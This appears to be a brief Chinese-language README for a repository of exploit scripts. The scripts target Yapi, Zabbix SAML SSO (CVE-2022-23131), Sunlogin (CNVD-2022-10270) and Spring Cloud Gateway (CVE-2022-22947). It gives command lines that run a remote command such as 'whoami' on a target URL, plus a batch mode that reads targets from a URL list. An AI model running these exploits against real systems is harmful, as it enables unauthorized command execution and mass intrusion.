# vuln_script
漏洞脚本

```
Yapi远程命令执行漏洞.py
CVE-2022-23131 Zabbix SAML SSO认证绕过     CVE-2022-23131.py
```
## 向日葵存在命令执行漏洞(CNVD-2022-10270)     sunlogin_rce.py

## 验证
```
python3 sunlogin_rce.py
```
![image](https://user-images.githubusercontent.com/33044636/156746675-ae44db14-24f6-4bde-a400-07b970cf1fb5.png)




## Spring Cloud Gateway 远程代码执行漏洞       CVE-2022-22947.py

### 单个验证

```
python3 CVE-2022-22947.py -u http://10.108.0.52:8080 -x whoami
```
![image](https://user-images.githubusercontent.com/33044636/156746308-40ff11ec-fdd1-4559-8d19-8bbc94a58ae0.png)


### 批量验证

```
python3 CVE-2022-22947.py -f url.txt
```
![image](https://user-images.githubusercontent.com/33044636/156746195-85182e7c-957f-49a5-b029-4c4e9ff6da28.png)
